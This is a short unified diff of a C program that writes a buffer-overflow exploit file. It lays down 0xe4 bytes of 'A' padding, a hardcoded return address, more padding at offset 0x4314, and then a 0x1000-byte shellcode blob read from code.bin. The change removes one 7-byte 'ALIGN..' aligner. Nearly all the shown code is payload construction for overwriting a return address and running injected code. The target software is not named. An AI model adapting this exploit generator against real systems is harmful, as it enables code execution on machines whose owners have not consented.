@@ -41,7 +41,6 @@ int main(int argc, char** argv)
         unsigned int qld_csm = 0;
         unsigned char code[0x1000];   
         unsigned char ret_addr[] = {0x80, 0x3e, 0xd2, 0x14};
-        unsigned char aligner[7] = "ALIGN..";
 
         FILE* fp_code = fopen("code.bin", "r");
         fread(code, 1, 0x1000, fp_code);
@@ -52,7 +51,6 @@ int main(int argc, char** argv)
         char padding = 'A';
         for (int i = 0; i < 0xe4; ++i) fwrite(&padding, 1, 1, fp);
         fwrite(ret_addr, 4, 1, fp);
-        fwrite(aligner, 7, 1, fp);
         fseek(fp, 0x4314, SEEK_SET);
         for (int i = 0; i < 0x68; ++i) fwrite(&padding, 1, 1, fp);
         fwrite(code, 0x1000, 1, fp);
